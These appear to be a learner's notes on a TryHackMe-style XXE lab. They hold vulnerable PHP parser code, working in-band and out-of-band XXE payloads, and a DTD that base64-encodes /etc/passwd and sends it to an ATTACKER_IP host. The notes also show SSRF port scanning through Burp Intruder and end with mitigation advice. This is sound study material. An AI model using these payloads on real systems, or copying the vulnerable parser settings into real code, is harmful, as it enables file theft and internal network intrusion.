@@ -1,0 +1,172 @@
+__________________________________________________________________________________________
+
+
+TASK 4 Exploiting XXE - In-Band
+
+In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. 
+This allows for straightforward data exfiltration and exploitation. 
+The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.
+
+Go to http://10.82.165.237/contact.php, and fill out the form.
+Click the submit button and intercept the request.
+The submitted data is processed by `contact_submit.php`, which contains vulnerable PHP code:
+    /*************************************************************************************
+    * libxml_disable_entity_loader(false);
+    * if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    *     $xmlData = file_get_contents('php://input');
+    *     $doc = new DOMDocument();
+    *     $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
+    *     $expandedContent = $doc->getElementsByTagName('name')[0]->textContent;
+    *     echo "Thank you, " . $expandedContent . "! Your message has been received.";
+    * }
+    *************************************************************************************/
+
+Inject the following payload to disclose `/etc/passwd`:
+    /*************************************************************************************
+    * <!DOCTYPE foo [
+    * <!ELEMENT foo ANY >
+    * <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    * <contact>
+    * <name>&xxe;</name>
+    * <email>test@test.com</email>
+    * <message>test</message>
+    * </contact>
+    *************************************************************************************/
+
+XML Entity Expansion:
+XML Entity Expansion is a technique used in XXE attacks where entities are defined in an XML document and expanded by the parser. 
+
+Attackers exploit this to access sensitive files or cause Denial of Service (DoS). 
+    /*************************************************************************************
+    * <!DOCTYPE foo [
+    * <!ELEMENT foo ANY >
+    * <!ENTITY xxe "Test message" >]>
+    * <contact><name>&xxe;</name><email>test@test.com</email><message>test</message></contact>
+    ************************************************************************************/
+    
+Here, &xxe; is expanded wherever it appears, enabling attacks like file disclosure or resource exhaustion.
+
+__________________________________________________________________________________________
+
+
+TASK 5 Exploiting XXE - Out-of-Band
+
+Out-of-band XXE refers to an XXE vulnerability where the attacker cannot see the server's response directly. 
+Instead, data is exfiltrated via alternative channels like DNS or HTTP requests. 
+
+The application processes uploaded files with the following vulnerable code:
+    /*************************************************************************************
+    * libxml_disable_entity_loader(false);
+    * $xmlData = file_get_contents('php://input'); 
+    * $doc = new DOMDocument();
+    * $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
+    * $links = $doc->getElementsByTagName('file');
+    * foreach ($links as $link) {
+    *     $fileLink = $link->nodeValue;
+    *     $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
+    *     $stmt->bind_param("s", $fileLink);
+    *     $stmt->execute();
+    *     echo $stmt->affected_rows > 0 ? "Link saved successfully." : "Error saving link.";
+    *     $stmt->close();
+    * }
+    *************************************************************************************/
+
+Start a Python web server to capture out-of-band requests:
+    /*************************************************************************************
+    * user@tryhack $ python3 -m http.server 1337
+    *************************************************************************************/
+
+Use the payload below for POST /submit.php , replacing ATTACKER_IP with your IP:
+    /*************************************************************************************
+    * <!DOCTYPE foo [
+    * <!ELEMENT foo ANY >
+    * <!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
+    * <upload><file>&xxe;</file></upload>
+    *************************************************************************************/
+
+The server will connect to your web server, confirming the vulnerability. 
+To exfiltrate data, create a DTD file (sample.dtd) with the following content:
+    /*************************************************************************************
+    * <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+    * <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
+    * %oobxxe;
+    *************************************************************************************/
+
+Modify your payload to reference the DTD file:
+    /*************************************************************************************
+    * <?xml version="1.0" encoding="UTF-8"?>
+    * <!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
+    * <upload>
+    *     <file>&exfil;</file>
+    * </upload>
+    *************************************************************************************/
+
+Resend the request. The server will fetch the DTD file and send the exfiltrated data to your web server. 
+Decode the Base64 data to retrieve the contents of `/etc/passwd`.
+
+__________________________________________________________________________________________
+
+
+TASK 6 SSRF + XXE
+
+Server-Side Request Forgery (SSRF) allows attackers to make the server send requests to unintended locations, such as internal services or files. Combined with XXE, this can scan internal networks, access restricted endpoints, or interact with local services.
+
+Example payload to exploit SSRF via XXE:
+    /*************************************************************************************
+    * <!DOCTYPE foo [
+    *   <!ELEMENT foo ANY >
+    *   <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
+    * ]>
+    * <contact>
+    *   <name>&xxe;</name>
+    *   <email>test@test.com</email>
+    *   <message>test</message>
+    * </contact>
+    *************************************************************************************/
+
+Steps to brute force open ports:
+    1. Use Burp Intruder with the payload above.
+    2. Highlight the port and set Payload type to Numbers (1-65535).
+    3. Start the attack and sort by response size to identify potential open ports.
+
+The server processes &xxe; by making an HTTP request to the specified URL, potentially exposing sensitive data like API keys or passwords.
+
+__________________________________________________________________________________________
+
+TASK 7 Mitigation
+
+Avoiding Misconfigurations
+    Misconfigurations in XML parser settings are a common cause of XXE-related vulnerabilities. 
+    Adjusting these settings can significantly reduce the risk of XXE attacks. 
+
+General Best Practices:
+    Disable External Entities and DTDs:   
+        As a best practice, disable the processing of external entities and DTDs in your XML parsers. 
+        Most XXE vulnerabilities arise from malicious DTDs.
+
+    Use Less Complex Data Formats: 
+        Where possible, consider using simpler data formats like JSON, which do not allow the specification of external entities.
+        
+    Allowlisting Input Validation: 
+        Validate all incoming data against a strict schema that defines expected data types and patterns. 
+        Exclude or escape XML-specific characters such as <, >, &, ', and ". 
+        These characters are crucial in XML syntax and can lead to injection attacks if misused.
+
+Mitigation Techniques in Popular Languages
+    Java - Use the DocumentBuilderFactory and disable DTDs
+    .NET - Configure XML readers to ignore DTDs and external entities:
+    PHP - Disable loading external entities by libxml:
+    Python - Use defusedxml library, which is designed to mitigate XML vulnerabilities:
+
+Regularly Update and Patch
+    - Software Updates: Keep all XML processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.
+    - Security Patches: Regularly apply security patches to web applications and their environments.
+
+Security Awareness and Code Reviews
+    - Conduct Code Reviews: Regularly review code for security vulnerabilities, especially code that handles XML input and parsing.
+    - Promote Security Training: Ensure developers are aware of secure coding practices, including the risks associated with XML parsing.
+
+__________________________________________________________________________________________
+
+
+Appendix:
